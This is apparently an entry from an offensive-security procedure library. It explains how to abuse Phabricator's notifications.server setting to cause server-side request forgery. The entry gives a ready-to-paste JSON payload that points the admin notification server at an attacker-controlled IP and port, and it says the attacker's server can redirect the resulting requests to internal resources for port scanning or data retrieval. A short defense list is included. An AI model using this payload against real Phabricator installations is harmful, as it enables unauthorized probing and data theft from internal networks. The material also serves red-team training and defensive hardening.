---
tags:
  - ssrf
  - configuration-modification
  - json-config
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/configure-phabricator-notification-servers-json]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:46.188Z'
sub_techniques: []
id: 29674fea-7485-4390-b15c-3f72be805949
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-Configuration-with-Malicious-Server-Details

## Summary

This procedure involves editing the Phabricator notifications.server configuration to insert malicious server details, causing SSRF by redirecting admin server connections to an attacker-controlled endpoint.

## Description

The configuration is a JSON array defining client and admin servers. By replacing the admin block's host with an attacker's IP, port 22281, and HTTP protocol, Phabricator will send a GET /status request to the malicious server upon connection. This server can then redirect to internal resources, enabling SSRF for port scanning or data retrieval. Limited to admins, but amplifies existing privileges.

## Requirements

1. Access to notifications.server config page
2. Attacker's server IP and port ready (e.g., X.X.X.X:22281)
3. Knowledge of JSON syntax for the config

## Defense

Defensive measures and detection strategies:

- Implement input validation on host/port/protocol in config saves
- Log and alert on changes to notification server configs
- Disable redirect following in Phabricator's HTTP client

## Objectives

1. Inject malicious admin server details
2. Save configuration without errors
3. Trigger Phabricator connection to malicious endpoint

## Instructions

### Step 1: Prepare Configuration JSON

**Context**: Copy base values and modify the admin block.

Use [[commands/configure-phabricator-notification-servers-json]] to generate the payload:

```json
[
  {
    "type": "client",
    "host": "phabricator.mycompany.com",
    "port": 22280,
    "protocol": "https"
  },
  {
    "type": "admin",
    "host": "X.X.X.X",
    "port": 22281,
    "protocol": "http"
  }
]
```

> Explanation: This sets the admin server to the attacker's control; expected output is valid JSON ready for pasting.

### Step 2: Apply and Save Changes

**Context**: Paste into the Database Value field and submit.

Enter the JSON into the editor and save.

> Expected output: Success message; Phabricator pings the new server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/configure-phabricator-notification-servers-json]]

## Tools Used


## Tags

- [[ssrf]]
- [[configuration-modification]]
- [[json-config]]
